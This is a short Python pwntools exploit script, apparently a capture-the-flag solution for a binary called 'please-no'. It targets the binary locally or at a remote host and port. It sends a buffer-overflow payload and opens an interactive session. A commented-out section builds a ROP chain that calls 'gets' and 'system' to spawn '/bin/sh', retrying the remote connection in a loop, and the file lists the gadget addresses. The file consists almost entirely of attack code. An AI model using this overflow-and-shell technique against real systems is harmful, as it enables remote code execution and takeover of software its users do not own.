#!/usr/bin/env python2

from pwn import *

local = True
if local :
    s = process('./please-no')
    print util.proc.pidof(s)
    pause()
else :
    s = remote('209.190.1.131', 9003)

#elf = ELF('./please-no')

"""
popret  = 0x80483c9
pop2ret = 0x804878a
pop3ret = 0x8048789
pop4ret = 0x8048788
"""

def solver() :
        ex = "A" * 20

        '''
        ex += p32(0x08048690) # func1
        ex += p32(0x0804878a) #        pop-pop-ret
        ex += p32(0x1B0B0C41) # arg1
        ex += p32(0xAE13374E) # arg2


        while True:
            r = remote("209.190.1.131", 9003)

            ROP = "A" * 20
            ROP += p32(b.symbols['gets'])
            ROP += p32(pr)
            ROP += p32(bss)
            ROP += p32(0xf75af020) # system
            ROP += p32(pr)
            ROP += p32(bss) # /bin/sh

            r.sendline(ROP)
            r.sendline("/bin/sh\x00")
            try:
                print r.recvline(timeout=5)
            except EOFError:
                print "Except"
                r.close()
                continue
            r.interactive()
        '''

        print s.sendline(ex)
        print s.recv()

        s.interactive()

if __name__ == '__main__' :
    solver()

